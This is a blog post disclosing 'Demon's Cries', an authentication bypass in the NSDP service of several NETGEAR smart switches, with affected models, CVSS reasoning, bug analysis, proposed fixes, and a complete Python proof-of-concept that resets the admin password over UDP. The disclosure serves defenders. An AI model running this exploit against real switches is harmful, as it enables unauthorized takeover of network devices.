<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Demon&#039;s Cries vulnerability (some NETGEAR smart switches) - gynvael.coldwind//vx.log</title>
<meta property="og:title" content="Demon&#039;s Cries vulnerability (some NETGEAR smart switches)" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link type="text/css" href="/style.css" rel="stylesheet"/>
<link type="text/css" href="/inpost.css" rel="stylesheet"/>
<link rel="shortcut icon" href="https://gynvael.coldwind.pl/fav.ico"/>
<link rel="alternate" type="application/rss+xml" href="rss_pl.php" title="gynvael.coldwind//vx.log (PL)" />
<link rel="alternate" type="application/rss+xml" href="rss_en.php" title="gynvael.coldwind//vx.log (EN)" />
<!--<meta name="viewport" content="width=device-width, initial-scale=1">-->
<meta property="og:image" content="https://gynvael.coldwind.pl/img/gynvael_logo.png" />
<style>
#consulting {
  display: block;
  width: fit-content;
  font-size: 0.8em;
  text-align: center;
  background-color: #2c2c5c;
  color: #a7a7ea;
  padding: 0.7em;
  padding-left: 1em;
  padding-right: 1em;
  clip-path: polygon(
    0 10px,
    10px 0,
    100% 0, 
    100% calc(100% - 10px), 
    calc(100% - 10px) 100%, 
    0 100%, 
    0 10px
 );
  text-decoration: none;
}
#consulting:hover {
  color: #2c2c5c;
  background-color: #a7a7ea;
}

@media (min-width: 1120px) {
  #consulting {
    display: block;
  }
}


#training {
  display: block;
  width: fit-content;
  font-size: 0.8em;
  text-align: center;
  background-color: #2c2c5c;
  color: #a7a7ea;
  padding: 0.7em;
  padding-left: 1em;
  padding-right: 1em;
  clip-path: polygon(
    0 10px,
    10px 0,
    100% 0, 
    100% calc(100% - 10px), 
    calc(100% - 10px) 100%, 
    0 100%, 
    0 10px
 );
  text-decoration: none;
  color: #a7a7ea;
}
#training:hover {
  background-color: #a7a7ea;
  color: #2c2c5c;
}

@media (min-width: 1120px) {
  #training {
    display: block;
  }
}

.top-button-container {
  position: absolute;
  left: 220px;
  top: 120px;
  width: 484px;
  display: flex;
  justify-content: space-evenly;
  align-items: center;

}

</style>
</head>
<body>
<div id="main">
<div id="header" style="position: relative;">
  <h1 id="logo"><a href="/?blog=1"><img src="/img/logo.gif" alt="gynvael.coldwin//vx.log"/></a></h1><img src="/images/something_suspicious.png" style="margin: -34px 74px 0px 0px; padding: 0px;" align="right" alt="" />
  <div class="top-button-container">
  <a id="consulting" href="https://hexarcana.ch/?utm=gyn-blog">Available for Consulting and Projects</a>
  <a id="training" href="https://hexarcana.ch/workshops/?utm=gyn-blog-w">Upcoming Talks</a>
  </div>
</div>

<div id="sidebar"><div class="section"><img src='/img/gynvael-close.jpg' style='margin-left:0.5em' /><br /><ul><li><a href="/">Return to dashboard <big>&#8682;</big></a></li></ul><br /><h3><em>Sections</em></h3>
<ul>
  <li><b>lang</b>: <a href="?blog=1&amp;lang=pl"><img src="/images/lang_pl.png" style="margin: 0" alt="PL" /></a> | <a href="?blog=1&amp;lang=en"><img src="/images/lang_en.png" style="margin: 0" alt="EN" /></a></li>
  <li><b>RSS</b>: <a href="/rss_pl.php"><img src="/images/lang_pl.png" style="margin: 0" alt="RSS PL" /></a> | <a href="/rss_en.php"><img src="/images/lang_en.png" style="margin: 0" alt="RSS EN" /></a></li>
	<li><br /></li>
<li><a href='?id=50'>About me</a></li>
<li><a href='?id=182'>Tools</a></li>
<li><br /></li>
<li><a href='https://youtube.com/c/GynvaelEN'>&rarr; <span style='background-color:#e62218;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>YT</span> YouTube (EN)</a></li>
<li><a href='/discord'>&rarr; <span style='background-color:#7087d8;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>D</span> Discord</a>
<li><a href='https://infosec.exchange/@gynvael'>&rarr; <span style='background-color:#6b65d8;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>M</span> Mastodon</a>
<li><a href='https://twitter.com/gynvael'>&rarr; <span style='background-color:#009def;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>T</span> Twitter</a>
<li><a href='https://github.com/gynvael'>&rarr; <span style='background-color:#282d31;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>GH</span> GitHub</a>
<br />

  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
  <a href='https://hexarcana.ch'><img src='/img/hexarcana160_2.png' style='margin-left: 0;' /></a>
    <br />
    <a href='https://hexarcana.ch'>My company's website</a>
  </div>







  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
    <a href='https://pagedout.institute/'><img src='/img/po_issue_5_rbanner.png' style='margin-left: 0;' /></a>
    <br />
    <a href='https://pagedout.institute/'>Paged Out! zine</a>
  </div>


  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
    <a href='https://dragonsector.pl/'><img src='/img/ds_logo_160.jpg' style='margin-left: 0;' /></a>
    <br />
    <a href='https://dragonsector.pl/'>Dragon Sector CTF Team</a>
  </div>

</ul></div>

		<div class="section"><h3><em>Links / Blogs</em></h3>
	
        <ul>
        <li><a href="http://dragonsector.pl"><big>&rarr;</big> dragonsector.pl</a></li>
        <li><a href="http://vexillium.org"><big>&rarr;</big> vexillium.org</a></li>
      
          <!--<li><a href="http://arashicoldwind.blogspot.com/"><big>&rarr;</big> arashi coldwind blogspot</a></li>-->

          <li><small><b>Security/Hacking:</b></small><ul>
          <li><a href="http://j00ru.vexillium.org/?lang=en">j00ru's blog</a></li>
          <li><a href="http://lcamtuf.blogspot.com/">lcamtuf's blog</a></li>
          <li><a href="http://blog.invisiblethings.org/">invisible things (new)</a></li>
          <li><a href="http://theinvisiblethings.blogspot.com/">invisible things (old)</a></li>
          <li><a href="http://liveoverflow.com/">liveoverflow's site</a></li>
          <li><a href="https://d3vnull.com/">/dev/null's site</a></li>
          <li><a href="http://blog.pi3.com.pl/">pi3's blog</a></li>
          <li><a href="http://icewall.pl/">icewall's blog</a></li>
          <li><a href="http://blog.cmpxchg8b.com/">taviso's blog</a></li>          
          <li><a href="http://wampir.mroczna-zaloga.org/">pawel's blog</a></li>
          <li><a href="http://www.sandeepkamble.com/">sandeep's blog</a></li>
          <li><a href="http://blog.kotowicz.net/">koto's blog</a></li>
          <li><a href="http://128nops.blogspot.ch/">carstein's blog</a></li>
          <li><a href="http://zaufanatrzeciastrona.pl/">zaufana trzecia strona</a></li>
          <li><a href="https://niebezpiecznik.pl/">niebezpiecznik</a></li>
          <li><a href="https://sekurak.pl/">sekurak</a></li>

</ul></li>

          <li><small><b>Reverse Eng./Low-Level:</b></small><ul>
          <li><a href="http://blog.rewolf.pl/blog/">rewolf's blog</a></li>
          <li><a href="http://gdtr.wordpress.com/">gdtr</a></li>
          <li><a href="http://omeg.pl/">spinning mirrors</a></li>
          <li><a href="https://www.secnews.pl/">security news</a></li>
          <li><a href="http://rev3rsed.blogspot.com/">rev3rsed</a></li> <!-- last post: 24.11.2015 -->
</ul></li>

          <li><small><b>Programming/Code:</b></small><ul>
          <li><a href="https://dev.krzaq.cc/">/dev/krzaq</a></li>
          <li><a href="http://sil2100.vexillium.org/">sil2100/vx's web log</a></li>
          <li><a href="http://asawicki.info/">adam sawicki</a></li>
          <li><a href="http://devkk.net/">devkk.net</a></li>
          <li><a href="http://xion.org.pl/">xion.log</a></li>
</ul></li>
                </div>

<div class="section"><h3><em><a href="?">Posts</a></em></h3>
<ul>
<li><small><a href="?id=797"><span class="val">Paged Out! #5 is out</span>,</a></small></li>
<li><small><a href="?id=796"><span class="val">CVEs of SSH talk this Thursday</span>,</a></small></li>
<li><small><a href="?id=793"><span class="val">Debug Log: Internet doesn't work (it was the PSU)</span>,</a></small></li>
<li><small><a href="?id=791"><span class="val">FAQ: The tragedy of low-level exploitation</span>,</a></small></li>
<li><small><a href="?id=789"><span class="val">Solving Hx8 Teaser 2 highlight videos!</span>,</a></small></li>
<li><small><a href="?id=788"><span class="val">Gynvael on SECURITYbreak podcast</span>,</a></small></li>
<li><small><a href="?id=786"><span class="val">Paged Out! #4 is out</span>,</a></small></li>
<li><small><a href="?id=785"><span class="val">I won't be able to attend CONFidence'24 after all :(</span>,</a></small></li>
<li><small><a href="?id=782"><span class="val">xz/liblzma: Bash-stage Obfuscation Explained</span>,</a></small></li>
<li><small><a href="?id=781"><span class="val">Two of my bookmarklets: image extraction and simple TTS</span>,</a></small></li>
<li><a href="/">&rarr; see all posts on main page</a></li>

	<li><br /></li>

      </ul></div>
	
	
	<div id="footer">
          // copyright &copy; Gynvael Coldwind<br/>
          // design &amp; art by Xa<br/>
          // logo font (birdman regular) by utopiafonts / Dale Harris<br/>
        <br/>
        /* the author and owner of this blog hereby allows anyone to test the security of this blog (on HTTP level only, the server is not mine, so let's leave it alone ;&gt;), and try to break in (including successful breaks) without any consequences of any kind (DoS attacks are an exception here) ... I'll add that I planted in some places funny photos of some kittens, there are 7 of them right now, so have fun looking for them ;&gt; let me know if You find them all, I'll add some congratz message or sth ;&gt; */
        <br/><br/>
        <b>Vulns found in blog:</b><br/>
        * XSS <i>(pers, user-inter)</i> by ged_<br/>
        * XSS <i>(non-pers)</i> by Anno &amp; Tracerout<br/>
        * XSS <i>(pers)</i> by Anno &amp; Tracerout<br/>
        * Blind SQLI by Sławomir Błażek<br/>
        * XSS <i>(pers) by </i>Sławomir Błażek<br/>
      </div>
</div><div id="content">
        <div class="title"><div class="inside"><div class="inside2"><div class="date">2021-09-06: </div><h2><a href="?id=740">Demon's Cries vulnerability (some NETGEAR smart switches)</a></h2><div class="tags">netgear:vulnerability</div></div></div></div>
        <div class="post"><div class="htmlpost"><a href="/?id=740"><img src="/img/demons-cries-small.jpg"
     alt="Name of the vulnerability - Demon's Cries - in a white horror-style font on stained bluish gray background"
     class="banner-fill"></a>
<p>TL;DR: NETGEAR just patched 3 reported vulnerabilities (<a href="/?id=740">Demon's Cries</a>, <a href="/?id=741">Draconian Fear</a> and <a href="/?id=742">Seventh Inferno</a>) in some managed (smart) switches. If you or your company owns any of these devices, <b>please patch now</b>.</p>

<p>Note: Details on Seventh Inferno will be publish on or after 13th September.</p>

<p>Affected devices:</p>
<ul>
  <li>GC108P</li>
  <li>GC108PP</li>
  <li>GS108Tv3</li>
  <li>GS110TPP</li>
  <li>GS110TPv3</li>
  <li>GS110TUP</li>
  <li>GS308T</li>
  <li>GS310TP</li>
  <li>GS710TUP</li>
  <li>GS716TP</li>
  <li>GS716TPP</li>
  <li>GS724TPP</li>
  <li>GS724TPv2</li>
  <li>GS728TPPv2</li>
  <li>GS728TPv2</li>
  <li>GS750E</li>
  <li>GS752TPP</li>
  <li>GS752TPv2</li>
  <li>MS510TXM</li>
  <li>MS510TXUP</li>
</ul>

<p>NETGEAR's advisory can be found here: <a href="https://kb.netgear.com/000063978/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Smart-Switches-PSV-2021-0140-PSV-2021-0144-PSV-2021-0145">Security Advisory for Multiple Vulnerabilities on Some Smart Switches, PSV-2021-0140, PSV-2021-0144, PSV-2021-0145</a>.</p>

<h3>CVSS, CVE, etc</h3>
<p>Some human readable details are in the next section.</p>
<ul>
  <li><b>Vulnerability Codename:</b> Demon's Cries</li>
  <li><b>Vendor-specific ID:</b> Either PSV-2021-0140 or PSV-2021-0145, not sure.</li>
  <li><b>CVE:</b> CVE-2021-40866</li>
  <li><b>CVSS:</b> 9.8 (Critical)<sup>1</sup>, CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (Note: thankfully this feature is NOT enabled by default)</li>
  <li><b>Patch Diff Risk:</b> High</li>
</ul>

<p><small><sup>1</sup> NETGEAR on the advisory page says it's 8.8 (High). The difference falls down to the AV:N vs AV:A part (i.e. Attack Vector: Network vs Adjacent). NETGEAR's argument is that basically since the attack cannot be done from the Internet / from outside of the LAN in which the device is, then the Attack Vector should be set to Adjacent. My argument is that while they are right on the technical part, the <a href="https://www.first.org/cvss/specification-document">CVSS v3.1: Specification Document</a> says <cite>Network should be used even if the attacker is required to be on the same intranet to exploit the vulnerable system (e.g., the attacker can only exploit the vulnerability from inside a corporate network)</cite>. Not that it changes anything ;)</small></p>

<h4>Detailed Report</h4>
<p>Published on September 6th, 2021.</p>

<code>
Demon's Cries


*** Summary:

Affected Model: NETGEAR GS110TPV3 Smart Managed Pro Switch (and some other)
Firmware Version: V7.0.6.3 (from 2021-05-07)

NETGEAR GS110TPV3 Smart Managed Pro Switch with SCC Control enabled* is
vulnerable to an authentication bypass resulting in the attacker being able to
change admin's password (among other things), resulting in a full compromise of
the device.

* SCC Control (NETGEAR Smart Control Center) is disabled by default, and must be
manually enabled in the web UI (Security > Management Security > SCC Control).

Attached PoC will change the password to "AlaMaKota1234".

This report also points out:
- A currently non-exploitable buffer overflow in sccd's password verification
  routine (triggerable even if SCC Control is disabled).
- A non-security logic bug in sccd's password verification routine preventing
  authentication in case of some password patterns.

IMPORTANT: This vulnerability is reported under the 90-day policy, i.e. this
report will be shared publicly with the defensive community on 6th September
2021. See https://www.google.com/about/appsecurity/ for details.

NOTE: At this point in time I haven't checked what other models are affected,
but I strongly suspect other NETGEAR devices reuse the same code.

NOTE: This vulnerability is very similar - if not identical - to one found in
2012 in GS108E and GS105E, and implemented as a "feature" in e.g. ProSafeLinux
project:
https://github.com/tabacha/ProSafeLinux/blob/aa768d658ec10aa96833087e8bc344356411533b/psl_class.py#L390




*** More details:

Netgear Switch Discovery Protocol (NSDP) is implemented by the /sqfs/bin/sccd
daemon. The protocol itself is UDP based (port 63324 in case of this model) and
each datagram consists of a 32 byte header followed by a Type/Length/Value
chain, with each TLV consisting of a 4 byte header (2 bytes Type, 2 bytes
Length), followed by the Value bytes.

The sccd daemon can operate in two modes:

  * Disabled (default), where it only answers basic queries about the device.
  * Enabled, where it allows some of the configuration to be changed, as well
    as grants access to downloading configs, uploading firmware images, etc.

Analyzing certain available administration tools painted a picture where most
"get" commands (used to retrieve information) can be operated without
authentication, however all of "set" commands require the type 10 "password
authentication" TLV to be first in the chain.

However, the sccd daemon on this device DOES NOT enforce this, i.e. the type 10
TLV can be omitted from the chain and in such case neither the password
verification takes place, nor does it seem to be required by any of the "set"
TLV handlers.

A case in point is the "set" TLV of type 9, which changes the password to the
one specified in the value. Sending just this one TLV is enough to change the
admin password on the device without knowing the previous password.

A funny bug related to authorization spawns from the fact that the password
(both in case of TLV type 10 "authentication" and TLV type 9 "password change")
is obfuscated by being XORed with "NtgrSmartSwitchRock". However, due to the
fact that in the handler of TLV type 10 an strlen() is called on the still
obfuscated password, it makes it impossible to authenticate correctly with
a password that happens to have the same character as the phrase above at a
given position.
E.g. let's say that the password is "Mug123" (note the "g" at position 3) -
XORed with the phrase above the result will be 03 01 00 43 61 5e. However,
strlen("\3\1\0\x43\x61\x53") will return 2 due to the null-byte in the middle,
and this value will be passed then to the password deobfuscation routine
(_sccd_password_decrypt), which in turn will deobfuscate only the first 2
characters of the password, preventing otherwise correct authentication.

One more vulnerability (benign in the current version of the firmware due to the
layout of the stack and presence of the stack canary) can be found in TLV type
10 handler even in case the sccd daemon operates in Disabled mode: the whole
password provided in the TLV is copied to a local buffer which is 65 bytes in
size, with no boundary check present. Pseudo-code:

  uint8_t passwordCopy[65];
  ...
  memcpy(passwordCopy, tlvValue, (uint)tlvValueSize);

Sending a TLV of type 10 with password set to e.g. 200 bytes will result in the
sccd daemon crashing:

  *** stack smashing detected ***: /sqfs/bin/sccd terminated


*** Proposed fix:

The obvious fix is to require TLV type 10 to be present in the TLV chain prior
to any request that requires authentication. Ideally this should be achieved by
adding metadata to each handler stating whether it requires authentication and
verifying whether TLV type 10 was in the chain (current datagram) and succeeded.
The metadata approach can be implemented by extending the already existing
TLV type handler tables with another field per handler. This approach is better
than checking whether TLV chain "had authentication" in each handler separately
(since it's easy to forget to copy-paste the authentication check code when
extending the protocol).

Important: authentication must be required in each UDP datagram, and should not
prevail between datagrams - otherwise a real admin might authenticate in one
datagram, and a local attacker might spoof a UDP packet to e.g. change the
password in the next datagram.

The fix for the logic bug with strlen() being used on obfuscated password is to
not use strlen() and instead rely on the known size of the password (see also
below).

The fix to the buffer overflow with password length is to reject any
authentication attempt where the size of the value is larger than the buffer
size (i.e. 64 bytes in this case). For future-proofing the amount of bytes
copied by memcpy() from the TLV to the local buffer should also be limited to
the buffer size.

Please let me know if you have any questions.


*** PoC Exploit:

#!/usr/bin/python3
import socket
from struct import pack, unpack
import threading
import time
import sys

UDP_IP = "192.168.2.14"    # Put target IP here.
UDP_PORT = 63324

PASSWORD = "AlaMaKota1234"

def db(v):
  return pack(">B", v)

def dw(v):
  return pack(">H", v)

def dd(v):
  return pack(">I", v)

def make_header(
    cmd,
    status=0,
    failure=0,
    manager_mac=bytes(b"\1\1\1\1\1\1"),
    agent_mac=bytes(b"\0\0\0\0\0\0"),
    seq=0,
):
  header = [
    db(1),
    db(cmd),
    dw(status),
    dw(failure),
    dw(0),
    manager_mac,
    agent_mac,
    dd(seq),
    b"NSDP",
    dd(0),
  ]

  return b"".join(header)

def make_tlv(type, data=b""):
  d = [
    dw(type),
    dw(len(data)),
    data
  ]
  return b''.join(d)

def make_end_tlv():
  return make_tlv(0xffff);

def encrypt_password(pwd):
  pwd = bytearray(pwd)
  super_secret_string = bytearray(b"NtgrSmartSwitchRock")

  for i in range(len(pwd)):
    pwd[i] ^= super_secret_string[i % len(super_secret_string)]

  return pwd

# Get sequence number.
if len(sys.argv) != 2:
  print("usage: python3 nsdp_pwd_chg.py &lt;sequence-number&gt;")
  print(
      "Start with sequence-number 1. If it doesn't work, try a higher number.")
  sys.exit(1)

# Construct the NDSP packet.
COMMAND_REQ_GET = 1
COMMAND_REQ_SET = 3

payload = make_header(
    COMMAND_REQ_SET,
    seq=int(sys.argv[1])
)

# TLV Type=10 (password authentication) seems optional :shrug:
payload += make_tlv(9, encrypt_password(bytes(PASSWORD, "utf-8")))
payload += make_end_tlv()

# Send the packet.
print("UDP target IP: %s" % UDP_IP)
print("UDP target port: %s" % UDP_PORT)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (UDP_IP, UDP_PORT))

print("Change password packet sent, waiting for response (10 sec)...")

# Wait for reply.

sock.settimeout(10)

try:
  data, addr = sock.recvfrom(4096)

  # Some heuristics to see if it worked.
  if len(data) == 38:
    print(f"IT WORKED! Try it logging in with password: {PASSWORD}")
  elif len(data) == 32:
    print("Failed. Maybe SCC Control is disabled?")
  else:
    print("No idea, heuristics failed. Try logging in anyway.")

except socket.timeout:
  print("No response - device not found or sequence number too low.")

sock.close() 
</code></div>
        <div class="postcomments"></div>
        </div>
<div id="comments"><h2>Add a comment:</h2>

<form action="?id=740" method="POST">
  <table>
    <tr><td>Nick:</td><td style="width: 60%"><input name="nick"/></td></tr>
    <tr><td>URL (optional):</td><td style="width: 60%"><input name="url"/></td></tr>
    <tr><td>Math captcha: 10 &lowast; 10 &#xff0b; 5 = </td><td style="width: 60%"><input name="captcha"/></td></tr>
    <tr><td colspan="2">
        <textarea name="text"></textarea>
  <input type="hidden" name="asdf" value="8a93f8deb6f66c47ae7259ef75e25382"/>
  <input type="submit" class="button" />
</td></tr>
  </table>
</form>
</div></div><div class="clear"></div>
</div>
</body>
</html>
